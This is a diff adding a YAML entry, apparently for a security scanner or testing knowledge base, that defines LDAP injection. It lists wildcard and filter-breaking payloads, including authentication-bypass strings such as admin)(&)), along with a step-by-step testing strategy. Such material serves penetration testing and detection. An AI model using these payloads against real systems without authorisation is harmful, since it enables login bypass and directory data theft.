@@ -1,0 +1,27 @@
+id: LDAPI
+name: LDAP Injection
+cwe:
+- CWE-90
+owasp: A03:2021 Injection
+severity_range: High - Critical
+description: User input is incorporated into LDAP queries without sanitization.
+detection:
+  payloads:
+  - '*'
+  - '*)(&'
+  - '*)(|(&'
+  - '*()|%26'''
+  - admin)(&))
+  - admin)(|(password=*))
+  - '*(|(mail=*))'
+  - '*)%00'
+  - admin))(|(objectClass=*)
+  strategy:
+  - 1. Identify LDAP-backed authentication or search features
+  - 2. Test with wildcard (*) and LDAP special characters
+  - '3. Test authentication bypass: admin)(&)) as username'
+  - 4. Test data extraction via OR-based injection
+  - 5. Check error messages for LDAP query structure leakage
+evidence_needed: Authentication bypass or data extraction via LDAP operator injection
+references:
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection
